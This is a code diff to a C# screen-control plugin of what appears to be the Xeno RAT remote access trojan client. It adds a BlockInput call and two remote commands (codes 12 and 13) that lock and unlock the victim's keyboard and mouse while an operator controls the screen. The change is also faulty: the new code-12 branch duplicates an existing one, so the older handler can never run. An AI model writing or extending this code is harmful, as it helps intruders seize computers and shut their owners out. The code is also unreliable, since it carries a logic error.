@@ -9,6 +9,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
 using xeno_rat_client;
 
 
@@ -24,6 +25,20 @@ namespace Plugin
 
         [DllImport("SHCore.dll", SetLastError = true)]
         public static extern int SetProcessDpiAwareness(int awareness);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
+
+        public void BlockScreen()
+        {
+            BlockInput(true);
+        }
+
+        public void UnblockScreen()
+        {
+            BlockInput(false);
+        }
 
         public async Task Run(Node node)
         {
@@ -130,9 +145,15 @@ namespace Plugin
                         int x = node.sock.BytesToInt(data,1);
                         int y = node.sock.BytesToInt(data,5);
                         Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
-
                         InputHandler.SimulateMouseMove(coords);
-                        
+                    }
+                    else if (data[0] == 12)
+                    {
+                        BlockScreen();
+                    }
+                    else if (data[0] == 13)
+                    {
+                        UnblockScreen();
                     }
                     else if (data[0] == 12)
                     {
